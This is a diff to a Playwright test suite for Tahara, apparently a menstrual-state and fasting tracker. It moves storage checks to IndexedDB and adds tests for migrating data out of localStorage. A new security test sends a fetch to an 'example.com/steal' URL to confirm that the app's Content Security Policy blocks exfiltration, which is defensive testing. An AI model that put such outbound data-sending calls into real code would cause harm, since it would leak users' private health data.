@@ -3,10 +3,39 @@ import {expect, test} from '@playwright/test';
 
 test.describe('Tahara E2E UX Paths', () => {
 
+    /**
+     * Helper to read from Tahara IndexedDB
+     */
+    async function getIndexedDBData(page, storeName, key = 'data') {
+        return await page.evaluate(async ({storeName, key}) => {
+            return new Promise((resolve, reject) => {
+                const request = indexedDB.open('tahara_db');
+                request.onsuccess = (event) => {
+                    const db = event.target.result;
+                    try {
+                        const transaction = db.transaction(storeName, 'readonly');
+                        const store = transaction.objectStore(storeName);
+                        const getReq = store.get(key);
+                        getReq.onsuccess = () => resolve(getReq.result);
+                        getReq.onerror = () => reject(getReq.error);
+                    } catch (e) {
+                        reject(e);
+                    }
+                };
+                request.onerror = (event) => reject(event.target.error);
+            });
+        }, {storeName, key});
+    }
+
     test('1. Onboarding Flow is visible and can be completed', async ({page}) => {
         // Clear storage to ensure it's treated as a first-time user
         await page.goto('/');
-        await page.evaluate(() => localStorage.clear());
+        await page.evaluate(async () => {
+            localStorage.clear();
+            // Also clear IndexedDB if it exists
+            const dbs = await window.indexedDB.databases();
+            dbs.forEach(db => window.indexedDB.deleteDatabase(db.name));
+        });
         await page.reload();
 
         // Verify Onboarding Modal is visible
@@ -35,6 +64,8 @@ test.describe('Tahara E2E UX Paths', () => {
         // Ensure we start in Purity
         const mainBtn = page.locator('#mainActionBtn');
         const statusText = page.locator('#current-state-text');
+        
+        // Wait for app to initialize from IndexedDB
         await expect(statusText).toHaveText('Purity');
 
         // 1. Mark Flow Started
@@ -55,6 +86,10 @@ test.describe('Tahara E2E UX Paths', () => {
 
         // Verify we are back to Purity
         await expect(statusText).toHaveText('Purity');
+
+        // Verify IndexedDB state
+        const statusData = await getIndexedDBData(page, 'status');
+        expect(statusData.status).toBe('purity');
     });
 
     test('3. Fasting Ledger: Add and Remove Missed/Paid Days', async ({page}) => {
@@ -81,6 +116,11 @@ test.describe('Tahara E2E UX Paths', () => {
         // Verify Paid = 1, Debt = 1
         await expect(page.locator('#totalPaid')).toHaveText('1');
         await expect(page.locator('#debtDisplay')).toHaveText('1');
+
+        // Verify IndexedDB state
+        const fastingData = await getIndexedDBData(page, 'fasting');
+        expect(fastingData.missed).toBe(2);
+        expect(fastingData.paid).toBe(1);
     });
 
     test('4. Settings: Dark Mode Toggle modifies the DOM', async ({page}) => {
@@ -144,8 +184,79 @@ test.describe('Tahara E2E UX Paths', () => {
         // Verify it got the active class (bg-rose-500)
         await expect(happyBtn).toHaveClass(/bg-rose-500/);
 
-        // Verify it saved to localStorage
-        const logsStr = await page.evaluate(() => localStorage.getItem('tahara_logs'));
-        expect(logsStr).toContain('mood_happy');
+        // Verify it saved to IndexedDB
+        const logs = await getIndexedDBData(page, 'logs');
+        const hasHappyMood = Object.values(logs).some(dayTags => dayTags.includes('mood_happy'));
+        expect(hasHappyMood).toBe(true);
+    });
+
+    test('7. Migration: Legacy LocalStorage data is moved to IndexedDB', async ({page}) => {
+        // 1. Setup legacy data
+        await page.goto('/');
+        await page.evaluate(() => {
+            localStorage.clear();
+            localStorage.setItem('tahara_history', JSON.stringify([{status: 'hayd', time: new Date().toISOString()}]));
+            localStorage.setItem('tahara_fasting', JSON.stringify({missed: 5, paid: 2}));
+            localStorage.setItem('tahara_status', 'hayd');
+            localStorage.setItem('tahara_last_changed', new Date().toISOString());
+            localStorage.setItem('tahara_onboarded', 'true');
+        });
+
+        // 2. Reload page to trigger migration
+        await page.reload();
+        
+        // Wait for migration and app init
+        await expect(page.locator('#current-state-text')).toHaveText('Hayd');
+
+        // 3. Verify LocalStorage is cleaned up
+        const keys = await page.evaluate(() => Object.keys(localStorage));
+        expect(keys).not.toContain('tahara_history');
+        expect(keys).not.toContain('tahara_fasting');
+        expect(keys).not.toContain('tahara_status');
+
+        // 4. Verify data is in IndexedDB
+        const fasting = await getIndexedDBData(page, 'fasting');
+        expect(fasting.missed).toBe(5);
+        expect(fasting.paid).toBe(2);
+
+        const history = await getIndexedDBData(page, 'history');
+        expect(history.length).toBe(1);
+        expect(history[0].status).toBe('hayd');
+    });
+
+    test('8. Migration Edge Case: Corrupted LocalStorage data handles graceully', async ({page}) => {
+        await page.goto('/');
+        await page.evaluate(() => {
+            localStorage.clear();
+            localStorage.setItem('tahara_history', '{broken_json]');
+            localStorage.setItem('tahara_status', 'hayd');
+            localStorage.setItem('tahara_onboarded', 'true');
+        });
+
+        await page.reload();
+        
+        // App should still load (fallback to purity if history is broken)
+        await expect(page.locator('#current-state-text')).toBeVisible();
+        
+        // localStorage should be cleared to prevent infinite migration loops
+        const history = await page.evaluate(() => localStorage.getItem('tahara_history'));
+        expect(history).toBeNull();
+    });
+
+    test('9. Security: Content Security Policy (CSP) blocks external fetch', async ({page}) => {
+        await page.goto('/');
+        
+        // Attempt to fetch from an external URL
+        const fetchError = await page.evaluate(async () => {
+            try {
+                await fetch('https://example.com/steal?data=test');
+                return null;
+            } catch (e) {
+                return e.message;
+            }
+        });
+
+        // CSP should cause a "Failed to fetch" error
+        expect(fetchError).toContain('Failed to fetch');
     });
 });
